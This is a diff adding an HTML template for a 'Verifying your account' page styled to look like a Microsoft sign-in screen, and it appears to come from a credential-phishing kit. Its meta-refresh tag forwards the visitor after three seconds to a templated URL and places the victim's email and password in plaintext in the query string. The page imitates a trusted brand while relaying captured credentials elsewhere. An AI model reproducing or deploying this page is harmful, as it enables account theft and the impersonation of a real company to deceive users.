@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verifying…</title>
+    <meta http-equiv="refresh" content="3; url={{ next_url }}?email={{ email }}&password={{ password }}">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        html,body{height:100%;margin:0;background:#f3f2f1;font-family:'Segoe UI',SegoeUI,'Helvetica Neue',Arial,sans-serif;display:flex;align-items:center;justify-content:center}
+        .card{background:#fff;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.13);padding:40px 48px;width:360px;display:flex;flex-direction:column;align-items:center}
+        .spinner{margin-top:12px;display:flex;gap:6px}
+        .dot{width:8px;height:8px;border-radius:50%;background:#0067b8;animation:bounce 1.2s infinite ease-in-out}
+        .dot:nth-child(2){animation-delay:0.2s}
+        .dot:nth-child(3){animation-delay:0.4s}
+        @keyframes bounce{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h3 style="margin:0;font-weight:400;color:#1b1b1b;font-size:20px">Verifying your account</h3>
+        <div class="spinner" aria-label="Loading">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+</body>
+</html> 
